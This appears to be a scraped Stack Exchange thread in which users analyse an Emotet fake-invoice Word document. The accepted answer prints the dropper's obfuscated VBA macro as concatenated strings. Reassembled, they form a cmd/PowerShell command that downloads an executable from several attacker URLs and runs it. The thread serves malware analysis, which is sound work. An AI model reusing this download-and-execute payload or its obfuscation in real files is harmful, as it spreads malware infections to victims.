{
  "title": "Emotet invoice, what is the embedded file inside the word document",
  "link": "https://reverseengineering.stackexchange.com/questions/20506/emotet-invoice-what-is-the-embedded-file-inside-the-word-document",
  "content": "This pastebin hosts current URLs hosting the fake invoice of Emotet malware, which is the dropper part of the malware.\n\nThe document is a Office Open XML, and there are two large non textual segments in it.\n\nI can't make any sense of the other segment.\n\nOne of them is this:\n\nI assume the other one contains at least some VB script and something else, but it decodes (assuming base64 like the jpg part) to nothing that file recognizes.\n\n",
  "votes": "1",
  "answers": 2,
  "views": "182",
  "tags": [
    "binary-analysis",
    "malware"
  ],
  "user": "alecail",
  "time": "Jan 30, 2019 at 9:30",
  "comments": [
    {
      "user": "Nordwald",
      "text": "I got no idea about the nature of this data - maybe the string at the very end (Project tvfvpv autoopen in wide / utf16) could be a clue",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "the vba appears to be some thing like this \nthe functions appears to be useless the zillnp appears to take this string\n\n\n\nyou can copy paste the strings and concatentate it \n\n```\nSub foo()\nzwrqd = \"c:\\on\" + \"jzi\" + \"oi\\\" + \"izwolr\" + \"\\poic\" + \"wo\\\" + \"..\\\" + \"..\\\"\nszrtncm = \"..\\win\" + \"dow\" + \"s\\sys\" + \"tem32\\\" + \"cmd.\" + \"exe /c\" + \" %Pro\" + \"gram\"\nuvkplhz = \"Data\" + \":~0,1\" + \"%%Pro\" + \"gra\" + \"mData:\" + \"~9,\" + \"2% /\" + \"V:ON/\" + \"C\" + Chr(34) + \"set\"\noujod = \" SiQ=;\" + \"'cjq\" + \"hpb'=\" + \"qijm\" + \"nd$}}\" + \"{hct\" + \"ac}};\"\nkbuitlk = \"kaerb\" + \";'bchk\" + \"zfb'=\" + \"dqk\" + \"zr$\" + \";hkjzj\" + \"lz$ me\" + \"tI-e\" + \"kovnI{\"\nbjzzhsa = \" )00\" + \"004 eg\" + \"- htg\" + \"nel.)h\" + \"kjzjlz\" + \"$ m\" + \"etI-t\" + \"eG((\" + \" fI;'\"\n\n\nhzipdp = \"jrkj\" + \"ik'=ci\" + \"ikdj$\" + \";)hkjz\" + \"jlz$\" + \" ,qjc\" + \"aki$(\" + \"eliFd\" + \"aoln\"\nwcwhr = \"woD.ir\" + \"hwidj\" + \"${yrt\" + \"{)ujb\" + \"wa$ \" + \"ni qj\" + \"cak\" + \"i$(h\"\nrmflwpm = \"caero\" + \"f;'\" + \"exe.'\" + Chr(43) + \"zbw\" + \"nifi$\" + Chr(43) + \"'\\'\" + Chr(43) + \"pmet\" + \":vne\"\nwuvcz = \"$=hkj\" + \"zjlz\" + \"$;'ziw\" + \"mvv'=p\" + \"zrifo\"\nkqwok = \"h$;'9\" + \"04' = \" + \"zbw\" + \"nifi$;\" + \"'sc\" + \"jmbw'\" + \"=fm\" + \"sqvii$\" + \";)'@\"\nwzkwjw = \"'(t\" + \"ilpS\" + \".'41\" + \"fpege\" + \"LDa\"\nhrzqojk = \"jCgKn\" + \"c/mo\" + \"c.sse\" + \"nisub\" + \"rusoh.\"\nzpftzo = \"www//:\" + \"ptth@\" + \"Mw6O6\" + \"3Df_\" + \"Cm066C\" + \"cdkU\" + \"7o/moc\"\n\nrnncbhd = \".ai\" + \"cizy\" + \"hp.ww\" + \"w//:pt\" + \"th@j\" + \"7OEo_7\"\nzihij = \"MhAbZ\" + \"p6jnH\" + \"p/z\" + \"t.oc.s\" + \"keeg\"\ndwpit = \"t.liam\" + \"//:\" + \"ptt\" + \"h@8or1\" + \"uzsd\" + \"Z8vi\" + \"e/RXI/\" + \"sed\" + \"ulcni-\"\nwccvfj = \"pw/moc\" + \".srev\" + \"ireht\" + \"ybkram\" + \"dnal//\" + \":ptth\" + \"@R8Fd3\"\nzuvtjrq = \"N9U\" + \"mbY\" + \"BzI/te\" + \"n.en\" + \"onil\"\nafactw = \"etoh.\" + \"www/\" + \"/:ptt\" + \"h'=ujb\" + \"wa$;\" + \"tnei\"\nworhm = \"lCbeW.\" + \"teN t\" + \"cejbo-\" + \"wen\" + \"=ir\" + \"hwidj$\" + \";'imsi\"\nvaipzq = \"zuu'=i\" + \"ijir\" + \"wb$ ll\" + \"%1,3-~\" + \":PME\" + \"T%h%\" + \"1,4-\" + \"~:EMA\" + \"NNOI\"\nzcdjvo = \"SSES%r\" + \"%1,5~\" + \":CILB\" + \"UP%wo\" + \"p&&\" + \"for /\"\nvwqmd = \"L %h i\" + \"n (65\" + \"7,-1\" + \",0)\" + \"do s\" + \"et \" + \"nu=!\"\ntlpisj = \"nu!!S\" + \"iQ:~\" + \"%h,\" + \"1!&\" + \"&if %h\" + \" eq\" + \"u 0 e\" + \"cho !n\"\nnsfmr = \"u:~-6\" + \"58!|\" + \" cmd\" + Chr(34) + \" \"\n\n\nuhdurz = zwrqd + szrtncm + uvkplhz + oujod + kbuitlk + bjzzhsa\njitovh = hzipdp + wcwhr + rmflwpm + wuvcz + kqwok + wzkwjw + hrzqojk + zpftzo\nwwiqv = rnncbhd + zihij + dwpit + wccvfj + zuvtjrq + afactw + worhm + vaipzq + zcdjvo + vwqmd + tlpisj + nsfmr\n\n\nMsgBox (uhdurz + jitovh + wwiqv)\n\nEnd Sub\n\n```\n",
      "votes": "1",
      "user": "blabb",
      "time": "Jan 30, 2019 at 13:01",
      "is_accepted": true,
      "comments": []
    },
    {
      "content": "Without reviewing the file itself, other than a VB script used as a macro, the second part is more likely an obfuscated/encrypted executable file of some sort.\n\nHowever since it's evident macros are used, the executable file (either a PE or a script) is probably at least somewhat obfuscated and will only be decoded/decrypted before being it's dropped to disk or something similar.\n\nStatically, your safest bet would be extracting the macro (that isn't hard, macros are pretty noticeable as far as the standard is concerned) and reversing the decoding/deobfuscating method used.\n\nAn easier approach would be to let the document drop the executable by opening it and letting the macros run inside a VM, optionally using something like process explorer/api monitor to catch the dropped file.\n\n",
      "votes": "2",
      "user": "NirIzr",
      "time": "Jan 30, 2019 at 9:56",
      "is_accepted": false,
      "comments": [
        {
          "user": "Nordwald",
          "text": "Marcos: pastebin.com/NtDy1qtD",
          "time": null
        },
        {
          "user": "alecail",
          "text": "@Nordwald Thanks. just for completeness, oletools' olevba  was able to extract the VB file.",
          "time": null
        }
      ]
    }
  ]
}